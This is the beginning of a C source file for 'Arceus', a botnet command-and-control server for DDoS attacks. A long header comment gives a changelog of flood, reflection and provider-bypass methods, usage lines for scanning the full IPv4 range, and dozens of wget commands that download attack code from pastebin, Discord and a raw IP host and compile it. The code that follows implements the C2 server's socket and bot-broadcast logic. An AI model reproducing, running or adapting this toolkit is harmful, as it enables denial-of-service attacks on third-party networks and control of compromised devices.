/*
╔═════════════════════════╗
║         Arceus I        ║                                 ╔═════════════════════════╗
║           ---           ║                                 ║     ARCEUS I : BETA     ║
║          GL3.0          ║                                 ╚═════════════════════════╝
║           666           ║
╚═════════════════════════╝ 

╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║ THIS VERSION WILL 'NOT' BE RELEASED TO THE PUBLIC DUE TO THE REDUNDANT ABUSE FROM THE COMMUNITY USING CYBER CYBER-WARFARE WEAPONS SUCH AS THIS.║                 
║ IF YOU ARE ABLE TO GET 'YOUR' HANDS ON THIS, PLEASE RESPECT THE AUTHORISATION AND WORK THE DEVELOPERS HAVE PUT INTO THIS SOURCE / PROJECT BETA.║                 
╠═════════════════════════════════════════════════════════════════╦══════════════════════════════════════════════════════════════════════════════╣
║  LICENSING :  GNUV3 [GNU GENERAL PUBLIC LICENSE VERSION 3.0]    ║ PROJECT ARCEUS IS A C2 SOURCE USING A CHANNEL CONNECTION TO RUN A DISPLAY    ║                                                                         
║  VALID     :  03/23/19                                          ║ SCREEN ON THE CONNECTION STATED VIA THE PORT 'SCREENED' TO. THIS PROJECT     ║                                                                        
║  EXPIRY    :  03/23/22                                          ║ HAS CERTAIN DEPENDENCIES IN ORDER TO PROPERLY COMPLY WITH EACH ADMIN USING   ║                                                                           
║  --                                                             ║ ARCEUS. WE ARE IN NO JEOPARDY IF YOU ARE CAUGHT BY ANY MEANS. MEANING ANY    ║                                                                                      
║  STATE     :  PRIVATE                                           ║ TYPE OF AUTHORITY, THIS APPLIES TO POSSESSION AND USAGE OF THIS PROJECT.     ║                                                                        
║  OWNERSHIP :  N/A                                               ║ --                                                                           ║ 
║  NAME      :  ARCEUS I                                          ║ THIS PROJECT WAS DESIGNED BOTH FOR ME AND JACK'S' USAGE ONLY. THIS WORK IS   ║                                                                           
║  --                                                             ║ UNDER 2 COUNTS OF LICENSING. SPECIFICALLY GNU AS WELL AS A PRIVATE PATENTING ║                                                                            
║  CCR       : XXX-223-389                                        ║ UNDER MY OWN DIVISION. NO COVERED WORK SHALL BE DEEMED PART OF AN EFFECTIVE  ║                                                                            
║  CIPHER    : SHA-512 , AES-BYTE , CIPHER-TLS                    ║ TECHNOLOGICAL MEASURE UNDER ANY APPLICABLE LAW FULFILLING OBLIGATIONS UNDER  ║                                                                            
║  GH-ID     : ZCH-CRI.SUCC                                       ║ ARTICLE 11 OF THE WIPO COPYRIGHT TREATY ADOPTED ON 20 DECEMBER 1996, OR      ║                                                                                
║  --                                                             ║ SIMILAR LAWS PROHIBITING OR RESTRICTING CIRCUMVENTION OF SUCH MEASURES.      ║                                                                        
║  OBJ-TYPE  : C2 SOURCE X TELNET LAYER                           ║ --                                                                           ║  
║  VSSH      : N/A                                                ║ YOU MAY CONVEY A COVERED WORK IN OBJECT CODE FORM UNDER THE TERMS OF SECTIONS║                                                                           
║  OS_TYPE   : CENT_OS [6] - [7]                                  ║ 4 AND 5, PROVIDED THAT YOU ALSO CONVEY THE MACHINE-READABLE CORRESPONDING    ║                                                                          
║  --                                                             ║ SOURCE UNDER THE TERMS OF THIS LICENSE.                                      ║                                       
║  BUILD     : BETA [RELEASE BEFORE VERSION I]                    ║ --                                                                           ║  
║  DESC      : NET-WSS                                            ║                                                                              ║
║  PRJ-VAS   : 6949-3853-9891                                     ║ THIS CODE WAS FOUNDED AND CREATED BY BOTH TRANSMISSIONAL AND FLEXINGONLAMERS.║                                                                             
║  --        :                                                    ║ WE HAVE THE ENTITLED AND ORIGINAL RIGHTS TO EDIT OR UPGRADE THIS FUNCTIONAL  ║                                                                           
║  --        :                                                    ║ CODE.                                                                        ║              
║  DEV-ALIAS : TRANSMISSIONAL / FLEXINGONLAMERS                   ║                       YOURS TRULY, ZACH, TRANSMISSIONAL                      ║                                              
╚═════════════════════════════════════════════════════════════════╩══════════════════════════════════════════════════════════════════════════════╝


                      Another project me and jack have decided take on after a break of coding project 'Katura'
                      This new project is designed to fulfil the potential of a C2 source, outcompeting other C2 sources.
                      We have decided to try to recreate this source into such a tool where it will completely put
                      'Mirai' RCE-WGET exploitation to complete shame. 

                      This will be a continuous and ongoing project. We are hoping to soon create this into something that
                      exceeds the capabilities that are set by other developers creating such 'cyber-warfare' tools 
                      as this.

                      ---

                      Both me and Jack, Have the certain capabilities to create something so unique and better, through
                      the use of combined networking and programming knowledge.

                      This is a challenge both me and Jack, have decided to take on.

                      Till next time.
                      ___________________________________________________________________________________________________
╔════════╗
║BETA - 1║
╚════════╝ 
Created C2 Base || Process Terminator
Added: AddUserFunction || Added UserAccounts || Added Alternative Chatroom Source || Added Functional Arch Detector (working on it, bc is broken)
Added: Added Portscanner || Added IPGeolocation
Added: Functional Logs, Includes ["IP", "Error", "LogOut", "Shell", "server"]
Added: UserID(s) ||  MD5Format For User Information
=========================
╔════════╗
║BETA - 2║
╚════════╝ 
Managed Bot/Client
Added New Layer4 UDP Methods Including ["STOMP", "HOME", "RAID"]
Added New Layer4 TCP Methods Including ["TCP-CRI", "TCP-ZACH"]
Added: Arch Detector via ["x86_64", "x86_32", "Arm4", "Arm5", "Arm6", "Arm7", "Mips", "Mipsel", "Sh4", "Ppc", "spc", "M68k", "Arc"]
Added: Distro Detector via ["Ubuntu/Debian", "Gentoo", "REHL/Centos", "Open Suse"]
Added: DevType via ["Python", "python3", "perl"]
Added: Port Detector that dignifies Device Type via ["telnet", "ssh"] etc
=========================
╔════════╗
║BETA - 3║
╚════════╝ 
Managed C2/CnC
Added: Logging via ["Arceus_Shell.log", "Arceus_IP.log", "Arceus_Connection.log", "Arceus_Logout.log", "Arceus_Error.log"]  // We are logging user commands, IPs, errors, shell attempts, and User Log-Outs
Added: Edits to (HELP) Including ["INFO", "BOTS"]
Color Codes were only Inputed for the Katura_IP.log || Now being inputted for the connection handler via screen

IPLookup Script And Snippet taken from "Cayosin", credits to the original developer of both the script and snippet of code.
=========================
╔════════╗
║BETA - 4║
╚════════╝ 
Added IPHM Implementation > IP-Header Based methods now working. 
Added Methods: ["LDAP", "NTP", "SSDP", "TFTP", "PORTMAP"]
Added New functions, including an external SSH Scanner which uses IPBlocks based by country.
Also added alternative functions for Banning, {We are using IPTables to ban users via IP}
=====================================
╔════════╗
║BETA - 5║
╚════════╝ 
Added IPHM Extensions for the following methods: ["LDAP", "SSDP", "NTP", "TFTP", "PORTMAP"]
Added IPHM Scanners for the methods above.
Added process killers for all methods and scanners based over IPHM
Added External Scanner and IPBan system using IPTables
Added SystemDetection Into Client (We are displaying system type) via: ["Linux", "windows", "android"]
Added External Installation Script for IPHM Downloads. includes scanners and attack scripts. command = .install
=====================================
╔════════╗
║BETA - 6║
╚════════╝ 
Added new substrate format for SCKT_V2
Added a new custom 'LD_KERNEL' preload using a prime buffer size
Added New Char Injection method using Katura's binary execution system
Added & Patched all attack output ASCII as well as grammar
Added NetworkDelimiter, Allows screen to be more stable !
Added SPECIAL Attacks : ["ZCH-WSS, "STL-BOO", "EFT-PWR", "PMP-PMP","ZCH-CRI"]
Added New IPHM Based Methods (Yubina Collection); ["prowin", "syn9", "winseqid", "winsyn"]
Added New Process Killer for ALL IPHM Based methods.
Added Seperate commands for installing scanners and attack scripts.
Added New Methods To IPHM Banners, also changed the main menu and added {.iphm};
Added Seperate Section for scanners. (under admin menu); Changed command from {.next} to {.scanners}
Fixed Reply message for all IPHM Based attacks, now showing each method and kill command.
Fixed all menus, added new options, and changed main menu.
Added new methods to IPHM Menu: ["rawudp", "rawstd", "ovhbypass", "nfobypass", "cfbypass"]
Added new process killer for all scanners and scripts. external file: Process_Killer.py
Method OVHBYPASS = xDoS
Method NFOBYPASS = RAWUdp
Method CFBYPASS = CF_BYPASS
Method BO4BYPASS = xts3

╔════════╗
║BETA - 7║
╚════════╝ 
Additions:
Added New BW Based methods: ["DOMINATE", "VSE", "TELNET", "TCPABUSE", "UDPABUSE", "DOMINATE", "ESSYN", "CSYN", "ZSYN", "XSYN", "ISSYN"]
Added New Reflection Based Methods: ["CHARGEN", "SENTINEL", "NETBIOS", "MSSQL", "TS3"]
Added New Bypass Based Methods: ["XTS3/BO4BYPASS"]
Added New Process_Killer seperately for Scanners || This is external!
Added All New Methods to IPHM_Installer || install.py
Added New Menu for {.iphm} || New methods added!
Added New Snippets / Attack commands for new methods! || Also added new "Attack.Banners" for new methods.
Added New methods to Process_Killer
Added Section for links to all files! (Should be below all of these updates)
Added Following Linux Distros to DistroDetector in client/bot: ["Fedora", "Redhat", "Arch", "FreeBSD"]
Added Full section with Installation Logs, Usage Logs, and Compilation Logs for All IPHM Based Methods
Added new filepaths for all IPHM based files. Location: /root/amp/; all paths listed below the installs.
Added new filepaths for ALL external based files. paths: scripts="/root/scripts/" C2="/root/c2" BOT="/root/bot/" IPHM="/root/amp/" 
Fixed: Process_Killer For IPHM Based Methods || Now kills ONLY attack processes instead of scanners!
Fixed: Source Size: All menus are now 1 line. lmfao
Fixed: Defined STD_SIZE: Noticed issue inside of client, (I defined the default packet size for STD as 1460) - 
(When using HEX it calls to STD and uses it to send the attack, whilst adding PacketSize for user input) -
(It goes to read the user input for packetsize but it can not be done due to STD Packetsize being defines by default) - 
(commented out std def and added packetsize to HEX) - (Better exp below)
since i defined the packetsize by default, i had to change STD up and switch it from (std_size) to (Packetsize) and limited certain methods inside of the pcm to use the 
defined default for packet size giving users the chance to change the packet size to whatever they desire inside of Method: HEX
Changed STD Strings to make attacks more effective
Redefined Default PacketSize for STD - Using for certain methods: Mainly STD alone
Removed: IPHM Based Methods: ["rawudp", "rawstd"] - Replaced with: ["UDPABUSE", "TCPABUSE"]
Removed: First menu for process killer (Wasnt showing on screen and was fucking with the tsc)
Removed: UserID(s) ||  MD5Format For User Information || Update: 1
Removed: UserInfo /UserInformation Menu || Update: 4
Removed: All extra scanner process killer commands > all now in one command < runs IPHM_Scanner_Proces_Killer.py
Removed: DistroDetection for OS's: ["Redhat", "Arch", "FreeBSD", "Fedora"]
Creating method `LOCKDOWN` || This is fucked. 
`LOCKDOWN` Explained: Lockdown Logs all device connections. Connects to those devices, reads connections, spams those servers with connections causing all connected C2's to crash
then kills all connections and removes traces of files, and alternatives. locks the device with a 49 character password, re-roots the device twice and closes the connection.
Created Process_Killer for all IPHM Based Scanners
Created Process_Killer for all IPHM Based Attacks
Created New IPHM Installer for all attack scripts and Scanners

╔════════╗
║BETA - 8║
╚════════╝
Added: VIP Users
Added: VIP Only access to zachs custom methods
Added: Logging Directory for all .log files. || This includes the following: ["Arceus_Logout.log", "Arceus_IP.log", "Arceus_Connection.log", "Arceus_C2.log"]
Added: Directories for all files. (Instead of using root dir for all files we are using subdirs!)
Added: New Process Killer for IPHM. files include the following: ["IPHM_Attack_Process_Killer.py", "IPHM_Scanner_Process_Killer.py"]
Added: Methods to the IPHM AutoInstaller: (Zachs Methods): ["hun-fun", "ass-crk", "eft-pwr", "pmp-pmp", "zch-cri"]
Added: New Banner for Failed User logins: Old="Login Error!\r\nIf you run into this issue please contact the owner!"
(Working On New Arch Detector which works via C2 - We are reading Device types!)

Zach > Read the "exp.txt" within this folder < it explains what all of the directories are for, thanks <3











╔═════════════════════════════════════════════════════════╗
║ Arceus I - Compilation logs - Attack Scripts - Scanners ║
╚═════════════════════════════════════════════════════════╝
# LDAP      - 0 Error Logs - 0 Warning Logs  || Compile Success!  || SSDPScan      - 0 Error Logs - 3 Warning Logs  || Compile Success!
# SSDP      - 0 Error Logs - 0 Warning Logs  || Compile Success!  || SSDPScan      - 0 Error Logs - 3 Warning Logs  || Compile Success!
# NTP       - 0 Error Logs - 0 Warning Logs  || Compile Success!  || NTPScan       - 0 Error Logs - 3 Warning Logs  || Compile Success!
# CHARGEN   - 0 Error Logs - 0 Warning Logs  || Compile Success!  || CHARGENSCAN   - 0 Error Logs - 5 Warning Logs  || Compile Success!
# SENTINEL  - 0 Error Logs - 0 Warning Logs  || Compile Success!  || SETNINTELSCAN - 0 Error Logs - 3 Warning Logs  || Compile Success!
# NETBIOS   - 0 Error Logs - 0 Warning Logs  || Compile Success!  || NETBIOSSCAN   - 0 Error Logs - 3 Warning Logs  || Compile Success!
# MSSQL     - 0 Error Logs - 0 Warning Logs  || Compile Success!  || MSSQLSCAN     - 0 Error Logs - 3 Warning Logs  || Compile Success!
# TS3       - 0 Error Logs - 0 Warning Logs  || Compile Success!  || TS3SCAN       - 0 Error Logs - 3 Warning Logs  || Compile Success!
# PORTMAP   - 0 Error Logs - 0 Warning Logs  || Compile Success!  || PORTMAPSCAN   - 1 Error Logs - 0 Warning Logs  || Using New portmap Scanner! Results: 0 Error Logs - 3 Warning Logs || Compile Success!
# TFTP      - 0 Error Logs - 0 Warning Logs  || Compile Success!  || TFTPSCAN      - 1 Error Logs - 3 Warning Logs  || Using New TFTP Scanner!    Results: 1 Error Logs - 3 Warning Logs || Compile Fail ):
# TELNET    - 0 Error Logs - 0 Warning Logs  || Compile Success!
# VSE       - 0 Error Logs - 0 Warning Logs  || Compile Success!
# DOMINATE  - 0 Error Logs - 0 Warning Logs  || Compile Success!
# ZSYN      - 0 Error Logs - 0 Warning Logs  || Compile Success!
# XSYN      - 0 Error Logs - 0 Warning Logs  || Compile Success!
# CSYN      - 0 Error Logs - 0 Warning Logs  || Compile Success!
# ESSYN     - A couple thousand errors.. DO NOT COMPILE, must use as Raw C File and set permissions
# ISSYN     - A couple thousand errors.. DO NOT COMPILE, must use as Raw C File and set permissions

╔══════════════════════════════════════════════════════╗
║ Arceus I - Script Usages - Attack Scripts - Scanners ║
╚══════════════════════════════════════════════════════╝
###############
# Ok, so i suggest using -1 for all IPHM based methods < pps should = -1
# Also, when scanning, make sure to set the $delay to 1ms || $IPSTART is the beginning IPRange Ex: 0.0.0.0 || $IPEND is the end IPRange Ex: 255.255.255.255 || This will scan everything!
###############
# LDAP:       ./ldap $IP $PORT $LIST $THREADS $PPS $TIME       || LDAPSCAN:     ./ldapscan $IPSTART $IPEND $LIST $THREADS $DELAY
# SSDP:       ./ssdp $IP $PORT $LIST $THREADS $PPS $TIME       || SSDPSCAN:     ./ssdpscan $IPSTART $IPEND $LIST $THREADS $DELAY
# NTP:        ./ntp $IP $PORT $LIST $THREADS $PPS $TIME        || NTPSCAN:      ./ntpscan $IPSTART $IPEND $LIST $THREADS $DELAY
# CHARGEN:    ./chargen $IP $PORT $LIST $THREADS $PPS $TIME    || CHARGENSCAN:  ./chargenscan $IPSTART $IPEND $LIST $THREADS $DELAY
# SENTINEL:   ./sentinel $IP $PORT $LIST $THREADS $PPS $TIME   || SENTINELSCAN: ./sentinelscan $IPSTART $IPEND $LIST $THREADS $DELAY
# NETBIOS:    ./netbios $IP $PORT $LIST $THREADS $PPS $TIME    || NETBIOSSCAN:  ./netbiosscan $IPSTART $IPEND $LIST $THREADS $DELAY
# MSSQL:      ./mssql $IP $PORT $LIST $THREADS $PPS $TIME      || MSSQLSCAN:    ./mssqlscan $IPSTART $IPEND $LIST $THREADS $DELAY
# TS3:        ./ts3 $IP $PORT $LIST $THREADS $PPS $TIME        || TS3SCAN:      ./ts3scan $IPSTART $IPEND $LIST $THREADS $DELAY
# PORTMAP:    ./portmap $IP $PORT $LIST $THREADS $PPS $TIME    || PORTMAPSCAN:  ./portmapscan $IPSTART $IPEND $LIST $THREADS $DELAY
# TFTP:       ./sentinel $IP $PORT $LIST $THREADS $PPS $TIME   || SENTINELSCAN: its broken :/ ive tried 3 different versions LMFAO
# PROWIN:     ./prowin $IP                                     || Note this attack does not stop on its own, MUST KILL PROCESS!
# WINSYN:     ./winsyn $IP                                     || Note this attack does not stop on its own, MUST KILL PROCESS!
# WINSEQID:   ./winseqid $IP                                   || Note this attack does not stop on its own, MUST KILL PROCESS!
# YUBINA:     ./yubina $IP                                     || Note this attack does not stop on its own, MUST KILL PROCESS!
# OVHBYPASS:  ./ovhbypass $IP $PORT $TIME UDP                  || Source has 2 diffent methods: UDP and HTTP < we are using UDP
# NFOBYPASS:  ./nfobypass $IP $PORT
# CFBYPASS:   php CF_Bypass $URL $LIST $THREADS $TIME          || Needs a proxy list || Url must be http://SITE/ or https://SITE/
# BO4BYPASS:  ./bo4bypass $IP $PORT $PPS $TIME
# VSE:        ./vse $IP $THREADS $PPS $TIME
# DOMINATE:   ./dominate $IP $PORT $THREADS $PPS $TIME
# TELNET:     ./telnet $IP $THREADS $PPS $TIME
# TCP_ABUSE:  ./tcp_abuse $IP $PORT $THREADS $PPS $TIME
# UDP_ABUSE:  ./udp_abuse $IP $PORT $THREADS $PPS $TIME        || SO this method is a server suspended, apparently you can go after ranges this is the optional input: ./udp_abuse $IP $PORT $THREADS $PPS $TIME $STARTIP $ENDIP
# CSYN:       ./csyn $IP $PORT $THREADS $PPS $TIME
# XSYN:       ./xsyn $IP $PORT $THREADS $PPS $TIME
# ZSYN:       ./zsyn $IP $PORT $THREADS $PPS $TIME
# ISSYN:      ./issyn.c $IP $PORT $THREADS $PPS $TIME
# ESSYN:      ./essyn.c $IP $PORT $THREADS $PPS $TIME




Installs:
Scannable Methods:
wget -q https://pastebin.com/raw/cRt6CBpb -O ldap.c && gcc -o ldap ldap.c -pthread
wget -q https://pastebin.com/raw/Yy7MrvmU -O ldapscan.c && gcc -o ldapscan ldapscan.c -pthread
wget -q http://pastebin.com/raw/vpbXuKVA -O ssdp.c; gcc -o ssdp ssdp.c -pthread
wget -q http://pastebin.com/raw/7uNYKs4c -O ssdpscan.c; gcc -o ssdpscan ssdpscan.c -pthread
wget -q http://pastebin.com/raw/PJeYk4Bc -O ntp.c; gcc -o ntp ntp.c -pthread
wget -q http://pastebin.com/raw/XWFfm5hh -O ntpscan.c; gcc -o ntpscan ntpscan.c -pthread
wget -q http://pastebin.com/raw/Kktvq2pz -O chargen.c; gcc -o chargen chargen.c -pthread
wget -q http://pastebin.com/raw/FpeqRp6K -O chargenscan.c; gcc -o chargenscan chargenscan.c -pthread
wget -q http://pastebin.com/raw/jmPdAPPM -O sentinel.c; gcc -o sentinel sentinel.c -pthread
wget -q http://pastebin.com/raw/gX0waM82 -O sentinelscan.c; gcc -o sentinelscan sentinelscan.c -pthread
wget -q http://pastebin.com/raw/D0UFWXmU -O netbios.c; gcc -o netbios netbios.c -pthread
wget -q http://pastebin.com/raw/V6jTyjbi -O netbiosscan.c; gcc -o netbiosscan netbiosscan.c -pthread
wget -q http://pastebin.com/raw/RsYN9wYs -O mssql.c; gcc -o mssql mssql.c -pthread
wget -q http://pastebin.com/raw/3MT59SGE -O mssqlscan.c; gcc -o mssqlscan mssqlscan.c -pthread
wget -q http://pastebin.com/raw/LAb0nSbh -O ts3.c; gcc -o ts3 ts3.c -pthread
wget -q http://pastebin.com/raw/bgraxVGt -O ts3scan.c; gcc -o ts3scan ts3scan.c -pthread
wget -q http://pastebin.com/raw/PNDMd2CF -O portmap.c; gcc -o portmap portmap.c -pthread
wget -q http://pastebin.com/raw/LH6yB0Yt -O portmapscan.c; gcc -o portmapscan portmapscan.c -pthread
wget -q http://pastebin.com/raw/De6amhpb -O tftp.c; gcc -o tftp tftp.c -pthread
wget -q http://pastebin.com/raw/f1TkRk0x -O tftpscan.c; gcc -o tftpscan tftpscan.c -pthread
Server Methods:
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/yubina_collection/Files/prowin -O prowin; chmod 777 prowin
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/yubina_collection/Files/yubina -O yubina; chmod 777 yubina
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/yubina_collection/Files/winseqid -O winseqid; chmod 777 winseqid
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/yubina_collection/Files/winsyn -O winsyn; chmod 777 winsyn
Zachs Methods:

Bypass Methods:
wget -q https://cdn.discordapp.com/attachments/564177458631409694/574420527125364757/xDoS -O ovhbypass; chmod 777 ovhbypass
wget -q https://cdn.discordapp.com/attachments/545653871427715093/574418889484664852/RAWstd -O nfobypass; chmod 777 nfobypass
wget -q https://cdn.discordapp.com/attachments/564177458631409694/575879023440166932/CF_bypass.php -O CF_Bypass
wget -q https://cdn.discordapp.com/attachments/570046106474643486/575885559688462336/xts3 -O bo4bypass; chmod 777 bo4bypass
Extra Methods:
wget -q http://pastebin.com/raw/9v26VXgV -O vse.c; gcc -o vse vse.c -pthread
wget -q http://pastebin.com/raw/y6hAsCMv -O telnet.c; gcc -o telnet telnet.c -pthread
wget -q http://pastebin.com/raw/dR2pEeiq -O dominate.c; gcc -o dominate dominate.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/Other/tcp_abuse -O tcp_abuse 
wget -q http://98.143.148.177/Archive/reprobate/layer4/Other/udp_abuse -O udp_abuse
Extra Methods II:
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/zsyn.c -O zsyn.c; gcc -o zsyn zsyn.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/xsyn.c -O xsyn.c; gcc -o xsyn xsyn.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/csyn.c -O csyn.c; gcc -o csyn csyn.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/essyn.c -O essyn.c; chmod 777 essyn.c
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/issyn.c -O issyn.c; chmod 777 issyn.c
*/
//////////////////////////////////////////////////////////////////////////////
// Base Includes
#include <stdio.h> // Header Files [Interpreted Modules]
#include <stdlib.h> // Header Files [Interpreted Modules]
#include <string.h> // Header Files [Interpreted Modules]
#include <sys/types.h> // Header Files [Interpreted Modules]
#include <sys/socket.h> // Header Files [Interpreted Modules]
#include <netdb.h> // Header Files [Interpreted Modules]
#include <unistd.h> // Header Files [Interpreted Modules]
#include <time.h> // Header Files [Interpreted Modules]
#include <fcntl.h> // Header Files [Interpreted Modules]
#include <sys/epoll.h> // Header Files [Interpreted Modules]
#include <errno.h> // Header Files [Interpreted Modules]
#include <pthread.h> // Header Files [Interpreted Modules]
#include <signal.h> // Header Files [Interpreted Modules]
#include <ctype.h> // Header Files [Interpreted Modules]
#include <arpa/inet.h> // Header Files [Interpreted Modules]
//////////////////////////////////////////////////////////////////////////////
// Tool Includes
#include "resolver.h" // Header Files [Additional Interpreted Module]
//////////////////////////////////////////////////////////////////////////////
#define MAXFDS 1000000 // Maximum File Descriptor Value Statement [1000000]
//////////////////////////////////////////////////////////////////////////////
// Color Codes #Custom
#define purple = "\e[38;5;93m" // ANSI Colours
#define orange = "\e[38;5;202m" // ANSI Colours
#define pink = "\e[38;5;201m" // ANSI Colours
//////////////////////////////////////////////////////////////////////////////
// Project Information
#define Project "Arceus C2 Source" // Defining File Principals
#define Developer ["FlexingOnLamers", "GeorgiaCri", "Transmissional", "Zach"] // Defining File Principals
#define Allies [" We do not need friends. "] // Defining File Principals
//////////////////////////////////////////////////////////////////////////////
#define tools ["adduser", "domainresolver", "portscanner", "IPGeoLocation"] // Defining File Principals
//////////////////////////////////////////////////////////////////////////////
// File paths
#define ACC_FILE "arceus.txt"
#define scanners "amp/scanners/"
#define reflection "amp/methods/Reflection/"
#define bandwidth "amp/methods/Bandwidth/"
#define lists "amp/lists"
//////////////////////////////////////////////////////////////////////////////

struct account // Create Account Struct.
{
  char user[200]; // username
  char password[200]; // password
  char id [200]; // admin / normal [admin/vip/normal] 
};
static struct account accounts[500];

struct clientdata_t { // Create Client Data [Telnet] Struct.
  uint32_t ip;
    char x86;  // Char Every Line For Output Communication
    char mips; // Char Every Line For Output Communication
    char arm; // Char Every Line For Output Communication
    char spc; // Char Every Line For Output Communication
    char ppc; // Char Every Line For Output Communication
    char sh4; // Char Every Line For Output Communication
    char connected; // Char Every Line For Output Communication
} clients[MAXFDS]; // Set 'CLient' File Descriptor Value As Stated

struct telnetdata_t { // Create Telnet Data Struct.
  uint32_t ip; // Unsigned_Int 32 [Internet Protocol Output]
  int connected; // Use Integer To Display 'Connnected' Value
} managements[MAXFDS]; // Set 'CLient' File Descriptor Value As Stated

static volatile FILE *fileFD; // Static Volatile [Setting Each Integer For EPOLL and Listen FD]
static volatile int epollFD = 0; // Static Volatile [Setting Each Integer For EPOLL and Listen FD]
static volatile int listenFD = 0; // Static Volatile [Setting Each Integer For EPOLL and Listen FD]
static volatile int managesConnected = 0; // Static Volatile [Setting Each Integer For EPOLL and Listen FD]

int fdgets(unsigned char *buffer, int bufferSize, int fd) // Create Integers For Buffer Size 'Unsigned_Char'
{
  int total = 0, got = 1; // 0 = Deny / 1 = Accept Output
  while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; } // If Accepted [got == 1] - Display Output, Break line '\n'
  return got; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}
void trim(char *str) // Void To Char String, Do Not Output To Original Function Caller
{
  int i; // Output Statement Result Integers
  int begin = 0; // Output Statement Result Integers
  int end = strlen(str) - 1; // Output Statement Result Integers
  while (isspace(str[begin])) begin++; // Use 'While Loop' To Begin Function Call [Any Subzero Value] - [Calculus Is Irrelevant] - Check If Passed Character Is In 'White-Space'
  while ((end >= begin) && isspace(str[end])) end--; // Use 'While Loop' To Begin Function Call [Any Subzero Value] - [Calculus Is Irrelevant] - Check If Passed Character Is In 'White-Space'
  for (i = begin; i <= end; i++) str[i - begin] = str[i]; // 'I' Value - (i = begin; i <= end; i++)
  str[i - begin] = '\0'; // Start String Of 'I' Value
}

static int make_socket_non_blocking(int sfd) // Create Static Integer [Static Integer, Will Allow Concurrent Bind Socket]
{
  int flags, s; // Set Flag Integer
  flags = fcntl(sfd, F_GETFL, 0); // Set Flag Error Handle Output
  if (flags == -1) // Set Flag Value [-1]
  {
    perror("fcntl"); // Error Handling Output 
    return -1; // Error Value == -1 
  }
  flags |= O_NONBLOCK; // Set_Flag==NONBLOCK
  s = fcntl(sfd, F_SETFL, flags);
  if (s == -1) // Error Value == -1
  {
    perror("fcntl"); // Error Handling Output
    return -1; // Error Value == -1
  }
  return 0; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}


static int create_and_bind(char *port) // Socket Bind Interpretation [ Edited By Zach, Modified Header Address For Adjacent Binding and Listening]
{
  struct addrinfo hints; // Create Struct. For AddressInformation, Create 's' As Integer
  struct addrinfo *result, *rp; // Create Struct. For AddressInformation, Create 's' As Integer
  int s, sfd; // Create Struct. For AddressInformation, Create 's' As Integer
  memset(&hints, 0, sizeof(struct addrinfo)); // Fill Data Block Using 'memset'
  hints.ai_family = AF_UNSPEC; // Socket Properties - [SOCKSTREAM, AI, UNSPEC]
  hints.ai_socktype = SOCK_STREAM; // Socket Properties - [SOCKSTREAM, AI, UNSPEC]
  hints.ai_flags = AI_PASSIVE; // Socket Properties - [SOCKSTREAM, AI, UNSPEC]
  s = getaddrinfo(NULL, port, &hints, &result); // Defining 's' Value
  if (s != 0) // Call Function If 's' == 0
  {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s)); // Error Handling, 'Getting Address Information'
    return -1; // Error Value == -1
  }
  for (rp = result; rp != NULL; rp = rp->ai_next)
  {
    sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol); // Socket Bind Interpretation [ Modified To Be Created As One] -- [MORE STABLE]
    if (sfd == -1) continue; // Call Function If sfd == -1
    int yes = 1; // Yes == 1
    if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt"); // Improved Sockopt Handling, Using SOL_SOCKET
    s = bind(sfd, rp->ai_addr, rp->ai_addrlen); // Bind Everything Stated Above
    if (s == 0) // Call Function If 's' == 0
    {
      break; // Terminate Loop Function, Continue Connection [Broadcast]
    }
    close(sfd); // Close Concurrent Function [sfd]
  }
  if (rp == NULL) // rp == NULL, No Available Integer [May Modify This and State 'NULL' as 0]
  {
    fprintf(stderr, "Could not bind\n"); // Error Handling - Failed Socket Binding, This is Rare, Unless Same Output Port Is Used
    return -1; // Error Value == -1
  }
  freeaddrinfo(result); // Check Addresses That Have No Integer State Value '-1'
  return sfd;// Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}
void broadcast(char *msg, int us, char *sender) // Broadcast The Following On Administator [Screen]
{
        int sendMGM = 1; // Send Management Value Statement. This Is Usually Set As '1'
        if(strcmp(msg, "PING") == 0) sendMGM = 0; // We Are Using 'PING/PONG' V2. [Modified The General Network Threads, Should Stop The Source From Being Slow]
        char *wot = malloc(strlen(msg) + 10); // Char Every Line For Output Communication
        memset(wot, 0, strlen(msg) + 10); // Fill In Data Block Usinf Memset. [Add +10, To Concurrent Connection]
        strcpy(wot, msg); // Strcpy Function Copies The String Pointed To By S2 Into The Object Pointed To By S1.
        trim(wot); // Trim : [wot]
        time_t rawtime; // We Want To Display The Time
        struct tm * timeinfo; // Create Struct. For Time
        time(&rawtime); // Use 'Time' Module For 'rawtime' prefix
        timeinfo = localtime(&rawtime); // Show Time Info Using Local Time
        char *timestamp = asctime(timeinfo); // Char Every Line For Output Communication
        trim(timestamp); // Trim : [timestamp]
        int i; // Output Statement Result Integers
        for(i = 0; i < MAXFDS; i++) // Set I, With MAXFDS Value
        {
                if(i == us || (!clients[i].connected)) continue; // Show Clients Connected To Broadcast
                if(sendMGM && managements[i].connected) // Send Management, To Show Value
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL); // Client Connected Output
                        send(i, sender, strlen(sender), MSG_NOSIGNAL); // Client Connected Output
                        send(i, ": ", 2, MSG_NOSIGNAL); // Client Connected Output 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL); // Client Connected Output
                send(i, "\n", 1, MSG_NOSIGNAL); // Client Connected Output
        }
